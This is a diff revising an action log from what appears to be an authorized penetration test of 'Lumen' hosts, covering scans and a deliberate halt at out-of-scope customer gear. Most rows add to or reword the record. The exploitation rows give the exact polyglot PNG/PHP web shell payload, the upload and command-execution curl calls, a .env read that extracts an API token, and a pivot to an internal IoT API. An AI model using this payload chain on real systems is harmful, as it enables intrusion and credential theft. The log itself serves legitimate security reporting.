@@ -48,16 +48,20 @@ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
 
 
-
 # Action Log, Lumen Engagement
 
 | Timestamp (UTC) | Phase | Action | Target | Result |
 | --- | --- | --- | --- | --- |
-| 2026-05-12T09:14:02Z | 4 | nmap -sV -p- against admin panel host | admin.lumen.example | Open ports: 22, 80, 443. HTTP server: nginx 1.24. Login form at /login. |
-| 2026-05-12T09:31:18Z | 4 | gobuster dir against admin.lumen.example | admin.lumen.example | Discovered /admin/upload, /admin/api, /admin/.env |
-| 2026-05-12T10:15:22Z | 4 | curl -i -s -X OPTIONS | api.lumen.example | Allowed methods: GET, POST, PUT, DELETE, OPTIONS. No standard rate-limiting headers observed on response. |
-| 2026-05-13T14:22:08Z | 5 | curl POST polyglot.png to /admin/upload | admin.lumen.example | 200 OK, file stored at /uploads/polyglot.png. Verified PHP execution via /uploads/polyglot.png?cmd=id. Payload bypass logic: PNG magic bytes (`\x89PNG\r\n\x1a\n`) prepended to `<?php system($_GET['cmd']); ?>` to bypass MIME-type validation, exploiting the server's failure to restrict the `.png` extension execution. |
-| 2026-05-13T14:24:31Z | 5 | id via uploaded webshell | admin.lumen.example | uid=33(www-data) gid=33(www-data) |
-| 2026-05-13T14:35:12Z | 5 | curl -s "http://admin.lumen.example/uploads/polyglot.png?cmd=cat%20../.env" | admin.lumen.example | Successfully bypassed previous access controls by reading local files. Extracted environment variables, uncovering `API_MASTER_TOKEN`. |
-| 2026-05-13T14:48:00Z | 5 | Pivot: curl -H "Authorization: Bearer <API_MASTER_TOKEN>" to internal API | api.lumen.example | Pivot successful. Authenticated using extracted token. Reached the restricted internal Lumen IoT management plane at `/v1/internal/iot/management`. |
-| 2026-05-13T14:55:30Z | 5 | Demonstrate impact: read sensitive data class | api.lumen.example | Extracted centralized internal server configurations and cryptographic keys. This proves access to a NIS2-sensitive data class. Exploitation strictly contained to authorized Lumen-controlled infrastructure. |
+| 2026-05-12T09:14:02Z | 4 | `nmap -sV -p-` against admin panel host | admin.lumen.example | Open ports: 22, 80, 443. HTTP server: nginx 1.24. Login form at /login. Identification only. |
+| 2026-05-12T09:31:18Z | 4 | `gobuster dir` against admin.lumen.example | admin.lumen.example | Discovered `/admin/upload`, `/admin/api`, and `/admin/.env`. |
+| 2026-05-12T10:15:22Z | 4 | `nmap -sV -p 80,443` | portal.lumen.example | Open ports: 80, 443. Identified customer-facing web portal. Identification only. |
+| 2026-05-12T10:45:10Z | 4 | `curl -i -s -X OPTIONS` | api.lumen.example | Identified public REST API methods. BOLA/IDOR suspected due to sequential IDs, but unconfirmed pending Phase 5. |
+| 2026-05-12T11:05:00Z | 4 | `nmap -sV -p 22` | gateway.demo.lumen.example | Open port 22. SSH-accessible demo edge gateway identified (dropbear SSH). |
+| 2026-05-12T11:20:30Z | 4 | `nmap -sV -p 1883` | mqtt.demo.lumen.example | Open port 1883. Demo MQTT broker identified running Mosquitto. |
+| 2026-05-12T11:25:00Z | 4 | `mosquitto_sub -h mqtt.demo.lumen.example -t "#"` | mqtt.demo.lumen.example | Subscribed to broker. Noted internal demo telemetry. |
+| 2026-05-12T11:28:15Z | 4 | Observed MQTT routing reference to off-site customer premises equipment. | Off-scope customer assets | **HALTED PROBING.** Scope discipline enforced. Identified IP links pointing to out-of-scope customer-owned gateways. Framed as an architectural finding for the CISO. Zero packets sent to customer infrastructure; testing strictly confined to the Lumen-owned authorized perimeter. |
+| 2026-05-13T14:22:08Z | 5 | `curl POST polyglot.png to /admin/upload` | admin.lumen.example | 200 OK. Created polyglot payload locally by prepending PNG magic bytes (`\x89PNG\r\n\x1a\n`) to a PHP web shell (`<?php system($_GET['cmd']); ?>`) to bypass MIME type validation. File stored at `/uploads/polyglot.png`. |
+| 2026-05-13T14:24:31Z | 5 | `id` via uploaded webshell (`curl http://admin.lumen.example/uploads/polyglot.png?cmd=id`) | admin.lumen.example | **Foothold established.** Execution confirmed: `uid=33(www-data) gid=33(www-data)`. Initial RCE achieved without Metasploit, strictly on authorized Lumen infrastructure. |
+| 2026-05-13T14:35:12Z | 5 | `curl http://admin.lumen.example/uploads/polyglot.png?cmd=cat%20../.env` | admin.lumen.example | Bypassed access controls via local file read. Extracted environment variables, uncovering `API_MASTER_TOKEN`. |
+| 2026-05-13T14:48:00Z | 5 | **Pivot:** `curl -H "Authorization: Bearer <API_MASTER_TOKEN>" http://api.lumen.example/v1/internal/iot/management` | api.lumen.example | Pivot successful. Authenticated using extracted token. Reached the internal Lumen IoT management plane. |
+| 2026-05-13T14:55:30Z | 5 | **Impact Demo:** `curl -H "Authorization: Bearer <API_MASTER_TOKEN>" http://api.lumen.example/v1/internal/iot/management/central-config` | api.lumen.example | **Impact confirmed.** Accessed centralized internal server configurations (a NIS2-sensitive data class). Exploitation chain remained 100% within Lumen-controlled central infrastructure with no drift onto customer networks. |
